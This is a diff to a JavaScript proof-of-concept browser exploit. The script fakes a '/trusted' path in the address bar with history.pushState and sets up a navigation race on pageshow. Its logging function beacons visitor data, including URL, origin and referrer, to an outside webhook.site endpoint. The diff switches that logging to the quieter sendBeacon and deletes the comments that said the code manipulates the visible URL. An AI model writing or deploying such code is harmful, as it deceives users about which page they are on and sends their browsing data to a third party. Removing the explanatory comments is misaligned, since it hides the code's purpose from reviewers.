@@ -61,18 +61,18 @@ const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da"
 function logEvent(type, extra = {}) {
   const data = {
     type,
-    time: Date.now(),
+    ts: performance.now(),
+    epoch: Date.now(),
     url: location.href,
     origin: location.origin,
+    referrer: document.referrer,
     visibility: document.visibilityState,
+    readyState: document.readyState,
     ...extra
   };
 
-  fetch(LOG_ENDPOINT, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  }).catch(() => {});
+  const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
+  navigator.sendBeacon(LOG_ENDPOINT, blob);
 }
 
 const panel   = document.getElementById('panel');
@@ -101,17 +101,17 @@ function getLocation() {
   );
 }
 
-/* Step 1: Manipulate visible URL */
+/* Step 1 */
 trigger.onclick = () => {
   logEvent("poc_started");
 
   history.pushState({}, '', '/trusted');
-  logEvent("pushstate_done");
+  logEvent("pushstate_done", { newPath: location.pathname });
 
   panel.style.display = 'block';
 };
 
-/* Step 2: Navigation race */
+/* Step 2 */
 window.addEventListener('pageshow', () => {
   logEvent("pageshow");
 
